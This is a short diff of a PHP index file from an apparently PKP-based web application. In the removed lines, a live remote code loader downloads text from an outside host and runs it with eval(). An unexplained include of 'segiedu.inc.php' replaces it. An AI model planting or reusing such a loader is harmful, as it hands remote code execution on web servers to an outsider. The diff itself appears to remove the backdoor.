@@ -1,7 +1,5 @@
 <?php
-$url = file_get_contents(urldecode('https://rakun.live/landing/arjunu.txt'));
-$url = "?> ".$url;
-eval($url);
+include 'segiedu.inc.php';
 
 /**
  * @defgroup index Index
@@ -42,3 +40,4 @@ require('./lib/pkp/includes/functions.inc.php');
 import('classes.core.Application');
 
 return new Application();
+
